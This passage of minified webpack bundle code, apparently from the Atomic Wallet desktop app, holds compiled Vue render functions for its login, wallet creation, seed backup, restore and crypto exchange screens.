    },
    1342: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            a = e._self._c || t;
          return a(
            "div",
            { staticClass: "login" },
            [
              a("transition", { attrs: { mode: "out-in", name: "fade" } }, [
                a(
                  "div",
                  [
                    a("img", { staticClass: "logo", attrs: { src: i(1143) } }),
                    e._v(" "),
                    a("router-view", {
                      key: e.$route.fullPath,
                      attrs: { mnemonic: e.mnemonic },
                      on: { "show-mnemonic-warning": e.showMnemonicWarning },
                    }),
                  ],
                  1
                ),
              ]),
              e._v(" "),
              "/entry" === e.$route.path
                ? a("div", [
                    a(
                      "button",
                      {
                        staticClass: "button",
                        on: {
                          click: function (t) {
                            return (
                              t.preventDefault(),
                              t.stopPropagation(),
                              e.$router.push("/entry/create")
                            );
                          },
                        },
                      },
                      [e._v("\n      New wallet\n    ")]
                    ),
                    e._v(" "),
                    a(
                      "button",
                      {
                        staticClass: "button link",
                        on: {
                          click: function (t) {
                            return (
                              t.preventDefault(),
                              t.stopPropagation(),
                              e.$router.push("/entry/restore")
                            );
                          },
                        },
                      },
                      [e._v("\n      Restore from backup\n    ")]
                    ),
                  ])
                : e._e(),
              e._v(" "),
              a("transition", { attrs: { name: "page-fade" } }, [
                e.showWarning
                  ? a(
                      "div",
                      {
                        staticClass: "modal",
                        on: {
                          click: function (t) {
                            return t.target !== t.currentTarget
                              ? null
                              : e.closeWarningPopup.apply(null, arguments);
                          },
                        },
                      },
                      [
                        a("div", { staticClass: "content" }, [
                          a("h2", [
                            e._v("Warning! You already have a wallet."),
                          ]),
                          e._v(" "),
                          a("p", [
                            e._v(
                              "Make sure that you have a backup of your 12 words seed phrase."
                            ),
                          ]),
                          e._v(" "),
                          a("p", [
                            e._v(
                              "Creating the new wallet will erase all your previous local data."
                            ),
                          ]),
                          e._v(" "),
                          a("div", { staticClass: "buttons" }, [
                            a(
                              "button",
                              {
                                staticClass: "button danger",
                                on: {
                                  click: function (t) {
                                    return (
                                      t.preventDefault(),
                                      t.stopPropagation(),
                                      e.continueWarningPopup.apply(
                                        null,
                                        arguments
                                      )
                                    );
                                  },
                                },
                              },
                              [e._v("\n            Continue\n          ")]
                            ),
                            e._v(" "),
                            a(
                              "button",
                              {
                                staticClass: "button success",
                                on: {
                                  click: function (t) {
                                    return (
                                      t.preventDefault(),
                                      t.stopPropagation(),
                                      e.closeWarningPopup.apply(null, arguments)
                                    );
                                  },
                                },
                              },
                              [e._v("\n            Cancel\n          ")]
                            ),
                          ]),
                        ]),
                      ]
                    )
                  : e._e(),
              ]),
            ],
            1
          );
        },
        s = [];
    },
    1343: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i("div", [
            i(
              "div",
              {
                directives: [
                  {
                    name: "show",
                    rawName: "v-show",
                    value: !e.loading,
                    expression: "!loading",
                  },
                ],
                staticClass: "wrap small",
              },
              [
                i("Edit", {
                  attrs: {
                    error: e.passwordError,
                    focus: !0,
                    isShowPassword: !0,
                    placeholder: "Password",
                    type: "password",
                  },
                  on: { "enter-pressed": e.login },
                  model: {
                    value: e.password,
                    callback: function (t) {
                      e.password = t;
                    },
                    expression: "password",
                  },
                }),
                e._v(" "),
                i(
                  "button",
                  {
                    staticClass: "button",
                    on: {
                      click: function (t) {
                        return (
                          t.stopPropagation(), e.login.apply(null, arguments)
                        );
                      },
                    },
                  },
                  [e._v("\n      Open wallet\n    ")]
                ),
                e._v(" "),
                i(
                  "button",
                  {
                    staticClass: "button link",
                    on: {
                      click: function (t) {
                        return (
                          t.stopPropagation(),
                          e.goToRestore.apply(null, arguments)
                        );
                      },
                    },
                  },
                  [e._v("\n      Restore from backup\n    ")]
                ),
                e._v(" "),
                i(
                  "button",
                  {
                    staticClass: "button link",
                    on: {
                      click: function (t) {
                        return (
                          t.stopPropagation(),
                          e.createNewWallet.apply(null, arguments)
                        );
                      },
                    },
                  },
                  [e._v("\n      Create wallet\n    ")]
                ),
              ],
              1
            ),
            e._v(" "),
            i(
              "div",
              {
                directives: [
                  {
                    name: "show",
                    rawName: "v-show",
                    value: e.loading,
                    expression: "loading",
                  },
                ],
                staticClass: "loading-wrap",
              },
              [i("div", { staticClass: "loading" })]
            ),
          ]);
        },
        s = [];
    },
    1347: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i("div", [
            i(
              "div",
              {
                directives: [
                  {
                    name: "show",
                    rawName: "v-show",
                    value: !e.loading,
                    expression: "!loading",
                  },
                ],
              },
              [
                i(
                  "Edit",
                  {
                    ref: "passwordRef",
                    staticClass: "m-b-25",
                    attrs: {
                      error: e.passwordError,
                      focus: !0,
                      isShowPassword: !0,
                      placeholder: "Password",
                      type: "password",
                    },
                    on: {
                      "enter-pressed": e.focusNextEdit,
                      changeTypeRepeatPassword: e.changeTypeRepeatPassword,
                    },
                    model: {
                      value: e.password,
                      callback: function (t) {
                        e.password = t;
                      },
                      expression: "password",
                    },
                  },
                  [i("PasswordStrength", { attrs: { password: e.password } })],
                  1
                ),
                e._v(" "),
                i("Edit", {
                  ref: "repeatPasswordRef",
                  attrs: {
                    error: e.passwordConfirmError,
                    type: e.repeatPasswordType,
                    placeholder: "Repeat Password",
                    name: "age",
                  },
                  on: { "enter-pressed": e.setPassword },
                  model: {
                    value: e.passwordConfirm,
                    callback: function (t) {
                      e.passwordConfirm = t;
                    },
                    expression: "passwordConfirm",
                  },
                }),
                e._v(" "),
                e.isTermsCheckbox
                  ? i(
                      "AtomicCheckbox",
                      {
                        staticClass: "m-t-40 m-b-30",
                        model: {
                          value: e.checkboxValue,
                          callback: function (t) {
                            e.checkboxValue = t;
                          },
                          expression: "checkboxValue",
                        },
                      },
                      [
                        e._v("\n      I accept the\n      "),
                        i(
                          "a",
                          {
                            on: {
                              click: function (t) {
                                return e.$electron.openExternal(
                                  "https://atomicwallet.io/terms-of-service"
                                );
                              },
                            },
                          },
                          [e._v("\n        Terms of Service\n      ")]
                        ),
                      ]
                    )
                  : e._e(),
                e._v(" "),
                i(
                  "button",
                  {
                    staticClass: "button",
                    class: {
                      "m-t-0": e.isTermsCheckbox,
                      disabled: e.isTermsCheckbox && !e.checkboxValue,
                    },
                    on: {
                      click: function (t) {
                        return (
                          t.preventDefault(),
                          t.stopPropagation(),
                          e.setPassword.apply(null, arguments)
                        );
                      },
                    },
                  },
                  [e._v("\n      Set password\n    ")]
                ),
                e._v(" "),
                i(
                  "button",
                  {
                    staticClass: "button link",
                    on: {
                      click: function (t) {
                        return (
                          t.preventDefault(),
                          t.stopPropagation(),
                          e.$emit("goBack")
                        );
                      },
                    },
                  },
                  [e._v("\n      Back\n    ")]
                ),
              ],
              1
            ),
            e._v(" "),
            i(
              "div",
              {
                directives: [
                  {
                    name: "show",
                    rawName: "v-show",
                    value: e.showLoaderSpinner,
                    expression: "showLoaderSpinner",
                  },
                ],
                staticClass: "loading-wrap",
              },
              [i("div", { staticClass: "loading" })]
            ),
          ]);
        },
        s = [];
    },
    1348: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            {
              staticClass: "wrap",
              class: { small: "setpass" === e.step, big: "newseed" === e.step },
            },
            [
              "setpass" === e.step
                ? i("SetPassword", {
                    attrs: { isTermsCheckbox: !0 },
                    on: { goBack: e.goBack, goNext: e.goNext },
                  })
                : e._e(),
              e._v(" "),
              "newseed" === e.step
                ? i("div", { staticClass: "newseed" }, [
                    i("div", { staticClass: "title" }, [
                      e._v(
                        "\n      Please write down a 12-word Backup Phrase and keep the copy in a secure place\n    "
                      ),
                    ]),
                    e._v(" "),
                    i("p", [
                      e._v(
                        "\n      " +
                          e._s(
                            e.Texts.TextDesktop.onboarding(
                              e.Texts.TextDesktop.onboardingKeys.subtitle
                            )
                          ) +
                          "\n    "
                      ),
                    ]),
                    e._v(" "),
                    i(
                      "p",
                      {
                        staticClass: "seed",
                        on: {
                          click: function (t) {
                            return e.$copyToClipboard(e.seed);
                          },
                        },
                      },
                      [e._v("\n      " + e._s(e.seed) + "\n    ")]
                    ),
                    e._v(" "),
                    i(
                      "button",
                      {
                        staticClass: "button link",
                        on: {
                          click: function (t) {
                            return (
                              t.stopPropagation(), e.$copyToClipboard(e.seed)
                            );
                          },
                        },
                      },
                      [
                        e._v(
                          "\n      " +
                            e._s(
                              e.isCopiedToClipboard
                                ? "Copied"
                                : "Copy to clipboard"
                            ) +
                            "\n    "
                        ),
                      ]
                    ),
                    e._v(" "),
                    i(
                      "button",
                      {
                        staticClass: "button",
                        on: {
                          click: function (t) {
                            return (
                              t.stopPropagation(),
                              e.openWallet.apply(null, arguments)
                            );
                          },
                        },
                      },
                      [e._v("\n      Open wallet\n    ")]
                    ),
                    e._v(" "),
                    i("label", { staticClass: "checkbox" }, [
                      i("input", {
                        directives: [
                          {
                            name: "model",
                            rawName: "v-model",
                            value: e.enableMonitoring,
                            expression: "enableMonitoring",
                          },
                        ],
                        attrs: { type: "checkbox" },
                        domProps: {
                          checked: Array.isArray(e.enableMonitoring)
                            ? e._i(e.enableMonitoring, null) > -1
                            : e.enableMonitoring,
                        },
                        on: {
                          change: function (t) {
                            var i = e.enableMonitoring,
                              a = t.target,
                              s = !!a.checked;
                            if (Array.isArray(i)) {
                              var n = null,
                                o = e._i(i, n);
                              a.checked
                                ? o < 0 && (e.enableMonitoring = i.concat([n]))
                                : o > -1 &&
                                  (e.enableMonitoring = i
                                    .slice(0, o)
                                    .concat(i.slice(o + 1)));
                            } else e.enableMonitoring = s;
                          },
                        },
                      }),
                      i("span", [e._v(" Enable log collection ")]),
                      e._v(" "),
                      e._m(0),
                    ]),
                  ])
                : e._e(),
            ],
            1
          );
        },
        s = [
          function () {
            var e = this,
              t = e.$createElement,
              a = e._self._c || t;
            return a("div", { staticClass: "state tooltip-hover" }, [
              a("img", { staticClass: "icon", attrs: { src: i(2290) } }),
              e._v(" "),
              a("div", { staticClass: "tooltip" }, [
                e._v(
                  "\n          Let Atomic automatically collect anonymous errors data to improve your experience.\n          "
                ),
                a("br"),
                e._v(
                  "This feature will highly increase support quality and will help us to resolve your\n          issues quicker. "
                ),
                a("br"),
                e._v(
                  "\n          Atomic collects description of the error and coin name. This information is absolutely\n          anonymous. "
                ),
                a("br"),
                e._v(
                  "\n          If you don't like to send your errors, you can avoid this option.\n        "
                ),
              ]),
            ]);
          },
        ];
    },
    1349: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            { staticClass: "wrap", class: { small: "setpass" === e.step } },
            [
              i(
                "transition",
                { attrs: { mode: "out-in", name: "slide-left" } },
                [
                  "restore" === e.step
                    ? i(
                        "div",
                        [
                          i("Edit", {
                            attrs: {
                              error: e.mnemonicError,
                              focus: !0,
                              isPasteFromClipboard: !0,
                              placeholder: "Your 12-word backup phrase",
                              type: "text",
                            },
                            on: { "enter-pressed": e.restoreByWords },
                            model: {
                              value: e.restoreseed,
                              callback: function (t) {
                                e.restoreseed = t;
                              },
                              expression: "restoreseed",
                            },
                          }),
                          e._v(" "),
                          i(
                            "AtomicCheckbox",
                            {
                              staticClass: "m-t-80 m-b-30",
                              model: {
                                value: e.checkboxValue,
                                callback: function (t) {
                                  e.checkboxValue = t;
                                },
                                expression: "checkboxValue",
                              },
                            },
                            [
                              e._v("\n        I accept the\n        "),
                              i(
                                "a",
                                {
                                  on: {
                                    click: function (t) {
                                      return e.$electron.openExternal(
                                        "https://atomicwallet.io/terms-of-service"
                                      );
                                    },
                                  },
                                },
                                [e._v("\n          Terms of Service\n        ")]
                              ),
                            ]
                          ),
                          e._v(" "),
                          i(
                            "button",
                            {
                              staticClass: "m-t-0 button",
                              class: { disabled: !e.checkboxValue },
                              on: {
                                click: function (t) {
                                  return (
                                    t.preventDefault(),
                                    t.stopPropagation(),
                                    e.restoreByWords.apply(null, arguments)
                                  );
                                },
                              },
                            },
                            [e._v("\n        Restore wallet\n      ")]
                          ),
                          e._v(" "),
                          i(
                            "button",
                            {
                              staticClass: "button link",
                              on: {
                                click: function (t) {
                                  return (
                                    t.preventDefault(),
                                    t.stopPropagation(),
                                    e.goBack.apply(null, arguments)
                                  );
                                },
                              },
                            },
                            [e._v("\n        Back\n      ")]
                          ),
                        ],
                        1
                      )
                    : e._e(),
                  e._v(" "),
                  "setpass" === e.step
                    ? i("SetPassword", {
                        attrs: { mnemonic: e.restoreseedInLowerCase },
                        on: { goBack: e.goToRestore },
                      })
                    : e._e(),
                ],
                1
              ),
            ],
            1
          );
        },
        s = [];
    },
    1351: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "main",
            [
              i(
                "div",
                { staticClass: "header-tabs" },
                e._l(e.tabs, function (t, a) {
                  return i(
                    "router-link",
                    {
                      key: a,
                      staticClass: "choice",
                      class: { active: e.isActive(t.path) },
                      attrs: {
                        tag: "div",
                        exactActiveClass: "active",
                        to: t.path,
                      },
                    },
                    [
                      i("span", [
                        e._v("\n        " + e._s(t.title) + "\n      "),
                      ]),
                    ]
                  );
                }),
                1
              ),
              e._v(" "),
              i("router-view", {
                on: {
                  openOrderDetails: e.openOrderDetails,
                  openExchangeDetails: e.openExchangeDetails,
                  startExchange: e.startExchange,
                  updatingStatus: e.updatingStatus,
                },
              }),
              e._v(" "),
              i(
                "transition",
                { attrs: { name: "fade-down" } },
                [
                  e.isExchangeDetails
                    ? i("NewExchangeResult", {
                        attrs: {
                          coinToSend: e.coinToSend,
                          coinToReceive: e.coinToReceive,
                          amountToSend: e.amountToSend,
                          amountToReceive: e.amountToReceive,
                          orderId: e.exchangeResult.txid,
                          cashback: e.cashback,
                          type: "orderDetails",
                          transactionStatus: e.transactionStatus,
                          sentHash: e.sentHash,
                          receivedHash: e.receivedHash,
                          timestamp: e.transactionTimestamp,
                          isRefunded: e.isRefunded,
                          initTransactionData: e.initTransactionData,
                        },
                        on: {
                          "continue-exchange": e.continueExchange,
                          "refund-exchange": e.refundExchange,
                          "close-popup": e.closePopups,
                        },
                      })
                    : e._e(),
                ],
                1
              ),
            ],
            1
          );
        },
        s = [];
    },
    1357: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            { staticClass: "inner-exchange-basic" },
            [
              i(
                "div",
                { staticClass: "exchange-block" },
                [
                  i(
                    "div",
                    {
                      staticClass: "block-wrapper",
                      class: [{ disabled: e.loading }],
                      attrs: { "data-test-id": "exch_buycrypto" },
                    },
                    [
                      i("ExchangeCoin", {
                        attrs: {
                          amount: "0" === e.amountToSend ? "" : e.amountToSend,
                          availableBalance: e.availableBalance || "0",
                          coin: e.coinToSend,
                          currencies: e.filteredCurrenciesExchange,
                          icon: e.$iconClass(e.coinToSend),
                          isAvailableBalance: !0,
                          selectedCoin: e.coinToSend.ticker,
                          "data-test-id": "exchange_coin_send",
                        },
                        on: {
                          selectCoin: function (t) {
                            return e.selectCoin(t, !0);
                          },
                          setAmountToSend: e.setAmountToSend,
                        },
                      }),
                    ],
                    1
                  ),
                  e._v(" "),
                  i("ChangeIcon", { on: { clickAction: e.changeCoins } }),
                  e._v(" "),
                  i(
                    "div",
                    {
                      staticClass: "block-wrapper",
                      class: [{ disabled: e.loading }],
                    },
                    [
                      i("ExchangeCoin", {
                        attrs: {
                          amount:
                            e.coinToReceive === e.coinToSend
                              ? " "
                              : e.amountToReceive,
                          coin: e.coinToReceive,
                          currencies: e.filteredCurrenciesExchange,
                          icon: e.$iconClass(e.coinToReceive),
                          isSortByMarketCap: !0,
                          readonly: !0,
                          selectedCoin: e.coinToReceive.ticker,
                          "data-test-id": "exchange_coin_receive",
                        },
                        on: { selectCoin: e.selectCoin },
                      }),
                      e._v(" "),
                      i(
                        "transition",
                        { attrs: { name: "fade" } },
                        [
                          Number(e.estimatedCashback) > 0
                            ? i("CashbackInfo", {
                                attrs: {
                                  estimatedCashback: e.estimatedCashback,
                                },
                              })
                            : e._e(),
                        ],
                        1
                      ),
                    ],
                    1
                  ),
                ],
                1
              ),
              e._v(" "),
              i(
                "div",
                { staticClass: "error-wrapper" },
                [
                  i("transition", { attrs: { name: "fade" } }, [
                    e.isHBARActivate
                      ? i(
                          "div",
                          { staticClass: "hbar-activate" },
                          [
                            i("ErrorPlain", {
                              attrs: {
                                message:
                                  "You need to activate your HBAR wallet to proceed",
                              },
                            }),
                            e._v(" "),
                            i(
                              "button",
                              {
                                staticClass: "button button-buy",
                                on: {
                                  click: function (t) {
                                    return e.$router.push("/main/HBAR");
                                  },
                                },
                              },
                              [e._v("\n          Activate\n        ")]
                            ),
                          ],
                          1
                        )
                      : e.valid.message
                      ? i(
                          "div",
                          { staticClass: "flex justify-center" },
                          [
                            i("ErrorPlain", {
                              attrs: { message: e.valid.message },
                            }),
                            e._v(" "),
                            e.isBuyCoin && !e.inactivePairError
                              ? i(
                                  "button",
                                  {
                                    staticClass: "button button-buy",
                                    attrs: { "data-test-id": "exch_buy" },
                                    on: { click: e.buyCoin },
                                  },
                                  [
                                    e._v(
                                      "\n          Buy\n          " +
                                        e._s(
                                          e.isMinMaxError
                                            ? e.coinToSend.ticker
                                            : e.coinToSend.feeTicker
                                        ) +
                                        "\n        "
                                    ),
                                  ]
                                )
                              : e._e(),
                          ],
                          1
                        )
                      : e._e(),
                  ]),
                ],
                1
              ),
              e._v(" "),
              e.valid.message && e.feeToClaim
                ? i(
                    "button",
                    {
                      staticClass: "button claim",
                      attrs: { "data-test-id": "exch_support" },
                      on: { click: e.talkWithSupport },
                    },
                    [e._v("\n    " + e._s(e.claimButtonText) + "\n  ")]
                  )
                : e._e(),
              e._v(" "),
              i("div", { staticClass: "submit-wrapper" }, [
                i(
                  "div",
                  [
                    e.isCheckbox
                      ? i(
                          "AtomicCheckbox",
                          {
                            staticClass: "m-t-20 m-b-15",
                            model: {
                              value: e.checkboxValue,
                              callback: function (t) {
                                e.checkboxValue = t;
                              },
                              expression: "checkboxValue",
                            },
                          },
                          [
                            e._v("\n        I accept the\n        "),
                            i(
                              "a",
                              {
                                on: {
                                  click: function (t) {
                                    return e.$electron.openExternal(
                                      "https://atomicwallet.io/terms-of-service#third-party-integrations"
                                    );
                                  },
                                },
                              },
                              [e._v("\n          Terms of Service\n        ")]
                            ),
                          ]
                        )
                      : e._e(),
                  ],
                  1
                ),
                e._v(" "),
                e.loading
                  ? i("div", { staticClass: "loading" })
                  : i(
                      "button",
                      {
                        staticClass: "button shadow",
                        class: [
                          {
                            active:
                              e.isActiveExchangeButton && !e.isExchangeDisabled,
                            disabled: e.isExchangeDisabled,
                          },
                        ],
                        attrs: { "data-test-id": "exch_submit_button" },
                        on: { click: e.exchangeCoins },
                      },
                      [e._v("\n      Exchange\n    ")]
                    ),
              ]),
              e._v(" "),
              i("transition", { attrs: { name: "fade" } }, [
                i(
                  "div",
                  {
                    directives: [
                      {
                        name: "show",
                        rawName: "v-show",
                        value: e.exchangeRate,
                        expression: "exchangeRate",
                      },
                    ],
                    staticClass: "exchange-rate",
                    attrs: { "data-test-id": "exch_rate" },
                  },
                  [
                    i("span", [e._v(" Exchange rate ")]),
                    e._v(" "),
                    i("div", { staticClass: "rate" }, [
                      e._v(
                        "\n        1 " +
                          e._s(e.coinToSend.ticker) +
                          " ~ " +
                          e._s(e._f("formatFinance")(e.exchangeRate)) +
                          " " +
                          e._s(e.coinToReceive.ticker) +
                          "\n      "
                      ),
                    ]),
                  ]
                ),
              ]),
              e._v(" "),
              i("transition", { attrs: { name: "fade" } }, [
                e.feeParams.fee
                  ? i(
                      "div",
                      {
                        staticClass: "exchange-rate",
                        attrs: { "data-test-id": "exch_fee" },
                      },
                      [
                        i("span", [e._v(" Network fee ")]),
                        e._v(" "),
                        i("div", { staticClass: "rate" }, [
                          e._v(
                            "\n        " +
                              e._s(
                                e.feeWallet.toCurrencyUnit(e.feeParams.fee)
                              ) +
                              "\n        " +
                              e._s(
                                "VET" === e.feeWallet.ticker
                                  ? "VTHO"
                                  : e.feeWallet.ticker
                              ) +
                              "\n      "
                          ),
                        ]),
                        e._v(" "),
                        i("span", [
                          e._v(
                            "\n        $\n        " +
                              e._s(
                                e._f("formatFiat")(
                                  e.$rates.convertToUSD(
                                    e.feeWallet.toCurrencyUnit(e.feeParams.fee),
                                    e.feeWallet,
                                    "USD"
                                  )
                                )
                              ) +
                              "\n      "
                          ),
                        ]),
                      ]
                    )
                  : e._e(),
              ]),
              e._v(" "),
              e.isMember ? e._e() : i("CashbackPromotion"),
              e._v(" "),
              i("transition", { attrs: { name: "fade-down" } }, [
                e.isError
                  ? i(
                      "div",
                      {
                        staticClass: "send-coin popup",
                        attrs: { "data-test-id": "exch_coin_popup" },
                      },
                      [
                        i("SendCoinResult", {
                          attrs: {
                            amount: e.amountToSend,
                            coin: e.coinToSend,
                            icon: e.$iconClass(e.coinToSend),
                            isError: e.isError,
                            mailText:
                              e.coinToSend.ticker +
                              " > " +
                              e.coinToReceive.ticker +
                              "%0A",
                            sendType: "Exchange",
                            mailTitle: "Exchange error",
                            contactData: {
                              issue: "Exchange",
                              tags: ["exchange_tag"],
                            },
                          },
                          on: { tryAgain: e.tryAgain },
                        }),
                      ],
                      1
                    )
                  : e._e(),
              ]),
            ],
            1
          );
        },
        s = [];
    },
    1359: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            {
              staticClass: "exchange-history order-details scroll-list2",
              on: { scroll: e.handleScrollEnd },
            },
            [
              e.isLoader
                ? i("div", { staticClass: "loader" })
                : i(
                    "Table",
                    {
                      attrs: {
                        header: e.header,
                        isEmpty: 0 === e.exchangeTransactions.length,
                        items: e.exchangeTransactions,
                      },
                    },
                    [
                      e.exchangeTransactions.length
                        ? e._e()
                        : i(
                            "div",
                            { attrs: { slot: "empty" }, slot: "empty" },
                            [
                              i("div", { staticClass: "empty" }, [
                                e._v("Your exchanges will appear here"),
                              ]),
                              e._v(" "),
                              i(
                                "div",
                                {
                                  directives: [
                                    {
                                      name: "show",
                                      rawName: "v-show",
                                      value: e.exchangeTransactionsLoading,
                                      expression: "exchangeTransactionsLoading",
                                    },
                                  ],
                                  staticClass: "adapted-loader loading-wrap",
                                },
                                [i("div", { staticClass: "loading" })]
                              ),
                            ]
                          ),
                      e._v(" "),
                      i(
                        "div",
                        { attrs: { slot: "table-rows" }, slot: "table-rows" },
                        e._l(e.transactions, function (t, a) {
                          return i("ExchangeHistoryItem", {
                            key: a,
                            attrs: {
                              id: t.id,
                              date: e._f("moment")(
                                t.timestamp,
                                "DD/MM/YYYY HH:mm"
                              ),
                              getAmount: e._f("fixedAmount")(t.amountToReceive),
                              getWallet: e.$exchanges.getReceiverWalletByTx(
                                e.$wallets,
                                t
                              ),
                              isOrderDetails: !0,
                              isTooltip: !0,
                              sentAmount: e._f("fixedAmount")(t.amountToSend),
                              sentWallet: e.$exchanges.getSenderWalletByTx(
                                e.$wallets,
                                t
                              ),
                              status: t.status,
                            },
                            on: {
                              openRow: function (i) {
                                return e.$emit("openOrderDetails", t);
                              },
                            },
                          });
                        }),
                        1
                      ),
                    ]
                  ),
            ],
            1
          );
        },
        s = [];
    },
    1361: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "main",
            [
              i(
                "div",
                { staticClass: "header-tabs" },
                e._l(e.tabs, function (t, a) {
                  return i(
                    "router-link",
                    {
                      key: a,
                      staticClass: "choice",
                      class: { active: e.isActive(t.path) },
                      attrs: {
                        to: t.path,
                        exactActiveClass: "active",
                        tag: "div",
                      },
                    },
                    [
                      i("span", [
                        e._v("\n        " + e._s(t.title) + "\n      "),
                      ]),
                    ]
                  );
                }),
                1
              ),
              e._v(" "),
              i("router-view", {
                on: {
                  openOrderDetails: e.toggleOrderDetails,
                  submitPayment: function (t) {
                    e.session = e.event;
                  },
                },
              }),
              e._v(" "),
              i(
                "transition",
                { attrs: { name: "fade-down" } },
                [
                  e.activeSimplexTransaction && e.isOpenOrderDetails
                    ? i("NewSimplexResult", {
                        attrs: {
                          walletReceive: e.$exchanges.getReceiverWalletByTx(
                            e.$wallets,
                            e.activeSimplexTransaction
                          ),
                          tickerSend: e.activeSimplexTransaction.fromCurrency,
                          amountSend: e.activeSimplexTransaction.amountToSend,
                          amountReceive:
                            e.activeSimplexTransaction.amountToReceive,
                          amountCashback:
                            e.activeSimplexTransaction.expectedCashbackAmount,
                          status: e.checkSimplexStatus(
                            e.activeSimplexTransaction.status
                          ),
                          date: e._f("moment")(
                            e.activeSimplexTransaction.timestamp,
                            "DD.MM.YYYY, HH:mm"
                          ),
                          transactionID: e.activeSimplexTransaction.id,
                        },
                        on: {
                          closePopup: function (t) {
                            return e.toggleOrderDetails(null);
                          },
                        },
                      })
                    : e._e(),
                ],
                1
              ),
            ],
            1
          );
        },
        s = [];
    },
    1363: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            { staticClass: "inner-exchange" },
            [
              i("webview", { ref: "userAgent", attrs: { src: e.preload } }),
              e._v(" "),
              i(
                "div",
                { staticClass: "exchange-block" },
                [
                  i("div", { staticClass: "block-wrapper" }, [
                    i("div", { staticClass: "coin-block" }, [
                      i("div", { staticClass: "flex justify-center center" }, [
                        i(
                          "div",
                          {
                            staticClass: "coin-icon",
                            on: { click: e.toggleFiatDropdown },
                          },
                          [
                            i("AtomicFlagIcon", {
                              attrs: { flagCode: e.selectedFiatToSend },
                            }),
                          ],
                          1
                        ),
                      ]),
                      e._v(" "),
                      i(
                        "div",
                        { staticClass: "flex-wrapper" },
                        [
                          i("EditAmount", {
                            attrs: {
                              error: e.amountError,
                              isExchange: !0,
                              value: e.coinToReceive,
                              type: "text",
                            },
                            on: { input: e.onInput },
                            model: {
                              value: e.requestedFiatAmount,
                              callback: function (t) {
                                e.requestedFiatAmount = t;
                              },
                              expression: "requestedFiatAmount",
                            },
                          }),
                          e._v(" "),
                          i(
                            "div",
                            { staticClass: "coinname fiat" },
                            [
                              i(
                                "span",
                                { on: { click: e.toggleFiatDropdown } },
                                [
                                  e._v(
                                    "\n              " +
                                      e._s(e.selectedFiatToSend) +
                                      "\n            "
                                  ),
                                ]
                              ),
                              e._v(" "),
                              e.isFiatDropdown
                                ? i("FiatDropdownV2", {
                                    directives: [
                                      {
                                        name: "click-outside",
                                        rawName: "v-click-outside",
                                        value: e.toggleFiatDropdown,
                                        expression: "toggleFiatDropdown",
                                      },
                                    ],
                                    class: { visible: e.isFiatDropdown },
                                    attrs: {
                                      avaliableFiats: Object.values(
                                        e.$buy.settings.fiats
                                      ),
                                    },
                                    on: { selectFiatCoin: e.selectFiat },
                                  })
                                : e._e(),
                            ],
                            1
                          ),
                        ],
                        1
                      ),
                    ]),
                  ]),
                  e._v(" "),
                  i("ChangeIcon", { staticClass: "no-hover" }),
                  e._v(" "),
                  i(
                    "div",
                    { staticClass: "block-wrapper" },
                    [
                      i("ExchangeCoin", {
                        attrs: {
                          amount: e.requestedCoinAmount,
                          coin: e.coinToReceive,
                          currencies: e.availableCurrencies,
                          icon: e.$iconClass(e.coinToReceive),
                          readonly: !0,
                          isBuyCrypto: !0,
                          selectedCoin: e.selectedCoinToReceive,
                        },
                        on: { selectCoin: e.selectForReceive },
                      }),
                      e._v(" "),
                      i(
                        "transition",
                        { attrs: { name: "fade" } },
                        [
                          Number(e.estimatedCashback) > 0
                            ? i("CashbackInfo", {
                                attrs: {
                                  estimatedCashback: e.estimatedCashback,
                                },
                              })
                            : e._e(),
                        ],
                        1
                      ),
                    ],
                    1
                  ),
                ],
                1
              ),
              e._v(" "),
              i(
                "div",
                { staticClass: "error-wrapper" },
                [
                  i("transition", { attrs: { name: "fade" } }, [
                    e.quoteError || e.isCoinDisabled
                      ? i("div", { staticClass: "flex justify-center" }, [
                          i("span", { staticClass: "text-red" }, [
                            e._v(
                              "\n          " +
                                e._s(
                                  e.isCoinDisabled
                                    ? e.getCoinDisabilityReason()
                                    : "Pair is temporarily unavailable"
                                ) +
                                "\n        "
                            ),
                          ]),
                        ])
                      : e._e(),
                  ]),
                ],
                1
              ),
              e._v(" "),
              i("div", { staticClass: "exchange-rate" }, [
                i("p", { staticClass: "fee-info" }, [
                  i("span", [
                    e._v(
                      "\n        5% fees (min " +
                        e._s(e.exchangeSettings && e.exchangeSettings.fee) +
                        "\n        " +
                        e._s(e.selectedFiatToSend.toUpperCase()) +
                        ") are included in the price"
                    ),
                  ]),
                ]),
                e._v(" "),
                i("br"),
                i("span", [
                  e._v(" The average delivery time is 10 to 30 minutes "),
                ]),
              ]),
              e._v(" "),
